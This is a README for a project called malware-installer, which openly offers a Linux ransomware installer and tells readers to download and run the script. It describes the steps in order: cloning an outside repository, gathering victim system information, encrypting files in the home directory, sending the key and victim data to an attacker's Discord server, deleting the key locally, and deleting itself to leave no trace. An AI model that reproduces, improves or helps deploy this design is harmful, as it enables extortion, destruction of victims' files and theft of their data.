# malware-installer

This shell script can install and run malware/ransomware onto a linux computer

Download the shell script, make it executable, and execute it.

Join the managment discord server: https://github.com/levtechs/malware

This malware is capable of:
- installing itself and deleting itself when it is done
- sending information about victim computer to discord server above
- encrypting files in home directory of victim computer
- sending decryption key of encrypted file to discord server
- allowing attacker in discord server to create password for victim computer (password for managing installed malware)

Here is how the malware works in depth:

I) Setup

1. The setup.sh script will install a folder from another gihub repo that will handle everything. 
Here is the link to the repo with that folder: https://github.com/levtechs/malware
2) After it is done cloning the malware repository, it will make executable and run the main.sh file in the new malware folder. 
3) The main.sh file will run a python script to decrypt the token needed for the bot in the managment discord server.
4) The main.sh file will run a python script that will put the top system info into a sysinfo.txt file.
5) The main.sh file will run a python script that creates a list of non-hidden files on the computer, as well as the non-hidden files on the computer that will be infected. ("kill files")

II) Encryption

1) The main.sh file will run a python script that creates an encryption key and encrypts all of the "kill files"
2) The main.sh file will install the discord library/dependency that is used next.
3) The main.sh file will run the uplader.py script that uploads the device information as well as the list of encrypted files
4) The main.sh file will delete the encryption key, so that only the members of the discord server can see it

II) Cleanup

1) The members of the discord server can create a password that the malware can later refer to (not used for anything yet)
2) The setup.sh script is done running the main.sh script within the malware folder, so it cds back and deletes the malware folder, leaving no trace
